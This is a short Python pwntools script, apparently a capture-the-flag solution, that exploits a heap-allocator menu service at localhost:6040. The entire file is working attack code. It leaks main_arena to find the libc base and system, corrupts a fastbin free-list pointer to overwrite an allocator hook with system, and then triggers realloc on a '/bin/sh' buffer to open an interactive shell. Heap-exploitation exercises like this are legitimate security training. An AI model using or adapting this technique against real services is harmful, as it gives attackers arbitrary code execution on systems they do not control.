from pwn import *

def read2end(p):
    p.recvuntil('cmd>> ')

def Malloc(p, size):
    read2end(p)
    
    p.sendline('0')
    p.recvuntil('size>> ')
    p.sendline(str(size))

def Realloc(p, value, size):
    read2end(p)
    
    p.sendline('1')
    p.recvuntil('addr>> ')
   
    if value > 9:
        p.sendline(hex(value))
    else:
        p.sendline('i' + str(value))
   
    p.recvuntil('size>> ')
    p.sendline(str(size))
   
def Free(p, value):
    read2end(p)
    
    p.sendline('2')
    p.recvuntil('addr>> ')
    
    if value > 9:
        p.sendline(hex(value))
    else:
        p.sendline('i' + str(value))
    info = p.readline()

def Fill(p, value, data):
    read2end(p)

    p.sendline('3')
    p.recvuntil('addr>> ')
    
    if value > 9:
        p.sendline(hex(value))
    else:
        p.sendline('i' + str(value))
    
    p.recvuntil('data>> ')
    
    for i in data:
        p.sendline(hex(ord(i))[2:])

def Dump(p, value):
    read2end(p)
    
    p.sendline('4')
    p.recvuntil('addr>> ')
    
    if value > 9:
        p.sendline(hex(value))
    else:
        p.sendline('i' + str(value))
    
    return p.readline()

def Print(p, index):
    read2end(p)

    p.sendline('5')
    info = p.recvuntil('[ 6] Exit')
    addr = info.split('\n')[index].split('0x')[1].split(' -')[0]
    
    return int(addr, 16)

def get_from_dump(dump, index):
    tmp = dump.split(' ')
    for i in range(0, (len(tmp)-1)/8):
        ret = ''
        for j in range(0, 8):
            ret += tmp[i*8+7-j]
        if i == index:
            return int(ret, 16)
    return 0

def info_leak(p):
    size = 128
    Malloc(p, size)
    Malloc(p, size)
    Free(p, 1)      # a0
    Realloc(p, 0, size)
    Free(p, 0)      # 10
    Malloc(p, size) # 10
    Malloc(p, size) # a0
    Malloc(p, size) # 130
    Free(p, 0)

    return get_from_dump(Dump(p, 2), 0)

p = remote('localhost', 6040)

main_arena = info_leak(p) - 0x58
log.info('main_arena: 0x%x' % main_arena)
libc_base = main_arena - 0x3BE760
log.info('libc_base: 0x%x' % libc_base)
libc_system = libc_base + 0x46590
log.info('libc_system: 0x%x' % libc_system)

# fix malloc chunk layout
Free(p, 0)
Free(p, 1)

fs = 0x60    # fastbin_size
Malloc(p, 0x20) # chunk 0x10
Malloc(p, fs) # fastbin 0x40
Malloc(p, fs) # fastbin 0xb0

Free(p, 3) # free fastbin 0xb0
Free(p, 2) # free fastbin 0x40

# malloc 1st fastbin 0x40
Malloc(p, fs)

# overwrite 2nd fastbin
data = ''
for i in range(0, 0x80/0x8):
    data += p64(get_from_dump(Dump(p, 0), i))

payload = data[0:16] + p64(libc_base+0x3BE730-16-3) + data[16+8:]

Fill(p, 0, payload)

# malloc 2nd fastbin d0
Malloc(p, fs)

# malloc fake fastbin
Malloc(p, fs)

payload = '\x00' * 3
payload += p64(libc_system)
payload += '\x00' * (fs - len(payload))

Fill(p, 4, payload)

cmd = '/bin/sh'
cmd += '\x00' * (0x20 - len(cmd))

Fill(p, 1, cmd)

Realloc(p, 1, 256)

p.interactive()

p.close()
